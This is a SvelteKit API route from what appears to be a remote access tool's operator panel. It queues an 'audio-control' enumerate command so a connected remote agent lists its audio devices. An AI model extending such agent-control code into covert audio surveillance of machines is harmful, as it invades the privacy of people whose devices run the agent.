import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator } from '$lib/server/authorization';
import { audioBridgeManager } from '$lib/server/rat/audio';
import type { AudioControlCommandPayload } from '$lib/types/audio';

export const POST: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	const requestId = randomUUID();
	audioBridgeManager.markInventoryRequest(id, requestId);

	const payload: AudioControlCommandPayload = {
		action: 'enumerate',
		requestId
	};

	try {
		registry.queueCommand(id, { name: 'audio-control', payload }, { operatorId: user.id });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue audio inventory command');
	}

	return json({ requestId });
};
